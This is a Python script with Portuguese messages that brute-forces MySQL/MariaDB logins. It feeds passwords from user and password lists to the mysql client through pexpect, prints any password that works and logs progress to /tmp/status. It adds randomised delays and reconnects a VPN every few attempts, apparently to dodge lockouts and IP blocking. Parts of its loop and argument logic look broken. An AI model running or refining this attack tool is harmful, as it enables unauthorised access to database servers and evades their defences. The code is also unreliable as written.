import pexpect
import random
import passwords
import time
import vpn
import users

passwordsl = passwords.passwords_
usersl = users.users_
openvpn_enter = vpn.openvpn_enter_()

finded = False

j = 0

LOGIN_SUCCESS_MARIADB = 0
LOGIN_SUCCESS_MYSQL = 1
LOGIN_DENIED = 2
END = 3
TIMEOUT = 4

i = int(input("Qual o valor inicial do usuário: "))
j = int(input("Qual o valor inicial da senha: "))

destino = input("Qual o destino: ")

next_ = random.randint(30, 45)
next5 = 5

tries_exceeded = 0

while i < len(usersl):

    with open("/tmp/status", "r") as f:
        lines = f.readlines()

    lines[1] = f"{i}\n"

    with open("/tmp/status", "w") as f:
        f.writelines(lines)

    while j < len(passwordsl):

        with open("/tmp/status", "r") as f:
            lines = f.readlines()
    
        lines[2] = f"{j}\n"

        with open("/tmp/status", "w") as f:
            f.writelines(lines)

        process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)

        process.expect("Enter password:")
        process.sendline(str(passwordsl[j]))

        result = process.expect([
            "MariaDB",
            "mysql",
            "ERROR 1698",
            pexpect.EOF,
            pexpect.TIMEOUT,
        ])

        if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
            password = passwordsl[j]
            print(password)

            finded = True

            with open("/tmp/status", "r") as f:
                lines = f.readlines()
            
            lines[3] = "True\n"

            with open("/tmp/status", "w") as f:
                f.writelines(lines)

            break

        if result == LOGIN_DENIED:
            print("Senha recusada pelo MySQL.")
        elif result == END:
            print("A conexão com o MySQL foi encerrada.")
        elif result == TIMEOUT:
            print("Tempo limite aguardando a resposta do MySQL.")

        if j == next_:
            time.sleep(random.randint(15, 20))
            next_ += random.randint(35, 55)

        delay = random.randint(1, 3)
        time.sleep(delay)


        if result in (LOGIN_DENIED, END, TIMEOUT):
            tries_exceeded += 1

            if tries_exceeded >= 15:
                with open("/tmp/status", "r") as f:
                    lines = f.readlines()
                
                lines[4] = "Muitas tentativas falhadas. Arquivo encerrado\n"

                with open("/tmp/status", "w") as f:
                    f.writelines(lines)

                print("Muitas tentativas falhadas. Encerrando...")
                break

            process.close()
            continue

        tries_exceeded = 0
        
        if j >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()
            next5 += 5

        j += 1

    i += 1

    if tries_exceeded >= 15:
        break

openvpn_enter.close()